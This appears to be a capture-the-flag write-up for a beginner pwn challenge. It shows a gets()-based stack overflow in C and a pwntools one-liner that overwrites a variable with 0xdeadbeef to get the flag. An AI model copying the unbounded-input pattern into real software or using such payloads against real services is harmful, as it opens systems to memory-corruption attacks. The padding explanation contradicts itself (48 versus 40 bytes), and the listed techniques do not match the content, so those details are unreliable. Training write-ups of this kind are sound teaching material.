---
title: "Bug-Bounty-2"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 150
techniques: ["buffer-overflow", "ret2win", "shellcode", "stack-canary", "encoding"]
tools: ["pwntools", "netcat", "python"]
keywords: ["Bug-Bounty-2", "Pwny-CTF", "pwn", "buffer-overflow", "ret2win", "shellcode", "stack-canary", "encoding", "pwntools", "netcat", "python", "hex", "canary", "got", "padding"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/PWN-I/Bug-Bounty-2/notes.md"
---

# Bug-Bounty-2 (Pwny-CTF, pwn)

## Summary
Challenge **Bug-Bounty-2** from the Pwny-CTF CTF, pwn category. Main technique: buffer-overflow. Condition == -> exact value required: always p64(value), never a generic padding. This is the difference with Bug Bounty 1 (!=, any byte was enough).

## Statement and artefacts
We've got it this time! Not one, but TWO unpaid staff engineers at SUPERMEGACORP cooked this one up so now there's definitely no way it's vulnerable.

SUPERMEGACORP is so confident in this one that they've doubled the bug bounty to $1000!

`nc chal.sigpwny.com 1344`

**author**: Akhil

**Provided files / artifacts:**
- `work/Makefile (file, 118 B)`
- `work/challenge (file, 19.7 KB)`
- `work/challenge_patched (file, 19.7 KB)`

## Recognition signals
- Signal: Direct continuation of Bug Bounty 1: same structure (no canary, -O0), but the condition changes from!= to ==.
- Signal: Changing number at random (like 40 A + \0) is no longer enough: you must aim for 0xdeadbeef exactly.

## Resolution method
1. Read `challenge.c`: condition `number == 0xdeadbeef` → you must write this precise value, not just “a different value”.
2. Offset: `name[40]` + 8 bytes of alignment before `number` → 48 bytes of padding (like 1 - Manipulate, not 40 like Bug Bounty 1, because here we directly target the least significant byte so 40 would also be enough — but we write the full value with `p64`, so the padding goes up to `number`: 40 (name) + 8 (RBP alignment) = 48).
3. Payload: `p64(0xdeadbeef)` writes `ef be ad de 00 00 00 00` to memory (little-endian) → `number = 0x00000000deadbeef` ✔.
4. `payload = b"A" * 40 + p64(0xDEADBEEF)`; `sla(b">", payload)` → flag.

1. **Order ready**

```bash
python3 -c 'from pwn import *; io=remote("chal.sigpwny.com",1344); io.sendlineafter(b">", b"A"*40+p64(0xdeadbeef)); print(io.recvall(timeout=2))'
```

2. **Flaw**

```c
uint64_t number = 0xcafebabe;   // just after name in memory
char name[40];
gets(name);                     // no size limit
if (number == 0xdeadbeef) print_flag();   // you need a PRECISE value, not just different
```
Direct sequel to Bug Bounty 1: same structure (no canary, `-O0`), but the condition changes from `!=` to `==`. Changing `number` randomly (like 40 `A` + `\0`) is no longer enough: you have to aim for `0xdeadbeef` exactly.

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{double_the_engineers_double_the_bugs}

## Lessons and reusable patterns
- Condition == -> exact value required: always p64(value), never a generic padding. This is the difference with Bug Bounty 1 (!=, any byte was enough).
- p64() automatically manages the little-endian and the size (8 bytes): never write the hex by hand.
- Recognize the “Bug Bounty N” family: same source, condition which becomes more complicated (!= -> == -> then probably ret2win/ret2shellcode with protections activated, given SHSTK/IBT activated here).
